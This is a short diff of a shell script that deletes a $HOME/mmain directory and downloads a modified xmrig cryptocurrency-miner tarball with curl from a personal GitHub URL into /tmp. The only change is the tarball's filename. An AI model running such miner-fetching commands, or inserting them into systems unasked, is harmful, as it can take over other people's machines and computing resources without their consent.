@@ -97,8 +97,8 @@ echo "[*] Removing $HOME/mmain directory"
 rm -rf $HOME/mmain
 
 echo "[*] Downloading mmain advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/mmain.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx2/1/main/mmain.tar.gz file to /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx2/1/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
   exit 1
 fi
 
